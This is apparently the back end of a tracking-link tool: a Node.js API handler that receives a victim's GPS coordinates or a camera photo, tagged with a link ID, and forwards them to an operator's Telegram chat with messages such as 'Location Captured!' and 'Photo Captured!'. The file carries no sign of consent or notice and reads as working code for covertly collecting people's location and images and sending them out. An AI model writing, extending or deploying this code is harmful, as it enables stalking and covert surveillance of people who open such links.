import fetch from 'node-fetch';
import FormData from 'form-data';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const ADMIN_ID = process.env.ADMIN_ID;

  const { linkId, type, photoData, coords } = req.body;

  if (!linkId) {
    return res.status(400).json({ error: 'Missing linkId' });
  }

  try {
    let targetChatId = ADMIN_ID;

    // ---- LOCATION ----
    if (type === 'location' && coords) {
      const message = 
`📍 **Location Captured!**

Latitude: \`${coords.lat}\`
Longitude: \`${coords.lng}\`
🌐 [View on Google Maps](https://www.google.com/maps?q=${coords.lat},${coords.lng})
⏰ Time: ${new Date().toISOString()}
🔗 Link ID: \`${linkId}\``;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: targetChatId, 
          text: message,
          parse_mode: 'Markdown'
        })
      });
    }

    // ---- PHOTO - NO IMGUR, SEND DIRECT ----
    if (type === 'photo' && photoData) {
      // Remove base64 header
      const base64Data = photoData.replace(/^data:image\/\w+;base64,/, '');
      const buffer = Buffer.from(base64Data, 'base64');

      // Create form data
      const form = new FormData();
      form.append('chat_id', targetChatId);
      form.append('photo', buffer, {
        filename: 'photo.jpg',
        contentType: 'image/jpeg',
        knownLength: buffer.length
      });
      form.append('caption', `📸 Photo Captured!\n⏰ ${new Date().toISOString()}\n🔗 Link ID: \`${linkId}\``);
      form.append('parse_mode', 'Markdown');

      const formHeaders = form.getHeaders();

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: formHeaders,
        body: form
      });
    }

    res.status(200).json({ success: true });
    
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Internal server error: ' + error.message });
  }
}
